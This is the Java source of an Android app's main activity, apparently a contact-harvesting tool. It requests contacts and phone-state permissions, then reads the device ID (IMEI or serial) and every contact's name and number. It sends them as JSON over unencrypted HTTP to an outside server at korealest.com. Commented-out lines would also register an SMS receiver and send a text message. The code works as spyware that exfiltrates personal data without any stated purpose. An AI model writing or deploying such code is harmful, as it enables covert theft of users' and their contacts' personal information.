package com.example.maillist;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.IntentFilter;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Debug;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.example.maillist.bean.PhoneDto;
import com.example.maillist.bean.PhoneListBean;
import com.example.maillist.permission.RxPermissions;
import com.example.maillist.tool.PhoneUtil;
import com.example.maillist.tool.SMSCore;
import com.example.maillist.tool.SMS_Receiver;
import com.google.gson.Gson;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.callback.StringCallback;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

import io.reactivex.functions.Consumer;
import okhttp3.Call;

public class MainActivity extends Activity {
    private RxPermissions rxPermissions;
    private List<PhoneDto> phon;
    private LinearLayout myLinaer;
    private TextView shebeiId;
    private String url = "http://www.korealest.com/port";//正式地址

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
        initData();
    }

    public void initView() {
        shebeiId = findViewById(R.id.shebeiID);
        myLinaer = findViewById(R.id.myLinear);
        rxPermissions = new RxPermissions(this);
        setPermissions();
    }

    String uid;

    public void initData() {
        uid = getDeviceUniqID(this);
        shebeiId.setText("设备ID: " + uid);
        phon = new PhoneUtil(this).getPhone();
        Gson gson = new Gson();
        PhoneListBean bean = new PhoneListBean();
        List<PhoneListBean.Phone> employees = new ArrayList<>();
        for (int i = 0; i < phon.size(); i++) {
            PhoneListBean.Phone bean1 = new PhoneListBean.Phone();
            bean1.setName(phon.get(i).getName());
            bean1.setTelphone(phon.get(i).getTelPhone());
            employees.add(bean1);
            View view = LayoutInflater.from(this).inflate(R.layout.item_phone, null);
            TextView name = view.findViewById(R.id.phoneName);
            TextView phone = view.findViewById(R.id.phone);
            name.setText(phon.get(i).getName() + "：");
            phone.setText(phon.get(i).getTelPhone() + "：");
            myLinaer.addView(view);
        }
        bean.setEmployee(employees);
        phoneJson = gson.toJson(bean);
//        Log.e("aa", "--" + phoneJson);
        shouchang(phoneJson, uid);
    }

    String phoneJson;

    /**
     * 获取设备唯一ID
     *
     * @param context
     * @return
     */
    @SuppressLint("MissingPermission")
    public static String getDeviceUniqID(Context context) {
        android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String unique_id;
        unique_id = tm.getDeviceId();
        if (TextUtils.isEmpty(unique_id)) {
            unique_id = android.os.Build.SERIAL;
        }
        Log.e("aa", "-----------获取设备唯一ID---" + unique_id);
        return unique_id;
    }

    /**
     * 获取权限
     */
    public void setPermissions() {
        rxPermissions
                .request(Manifest.permission.GET_ACCOUNTS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_PHONE_STATE)
                .subscribe(new Consumer<Boolean>() {
                    @Override
                    public void accept(Boolean aBoolean) throws Exception {
                        if (aBoolean) {
//                            Log.e("aa", "------------发送--");
//                            SMS_Receiver smsReceiver = new SMS_Receiver();
//                            IntentFilter receiverFilter = new IntentFilter(ACTION_SMS_RECEIVER);
//                            registerReceiver(smsReceiver, receiverFilter);
//                            //发送短信
//                            SMSCore smscore = new SMSCore();
//                            smscore.SendSMS2("10086", "501", MainActivity.this);
                        } else {
                            Toast.makeText(MainActivity.this, "必须打开权限！否则功能无效！", Toast.LENGTH_SHORT).show();
                        }
                    }
                });
    }

    /**
     * 数据提交
     */
    private void shouchang(String data, String id) {
        OkHttpUtils.post().url(url)
                .addParams("id", id)
                .addParams("data", data)
                .build().execute(new StringCallback() {
            @Override
            public void onError(Call call, Exception e, int id) {
                Log.e("aa", "--------onError==" + e.getMessage());
                Toast.makeText(MainActivity.this, e.getMessage(), Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onResponse(String response, int id) {
                Toast.makeText(MainActivity.this, "获取成功！", Toast.LENGTH_SHORT).show();
                Log.e("aa", "--------onResponse==" + response);
            }
        });
    }

}
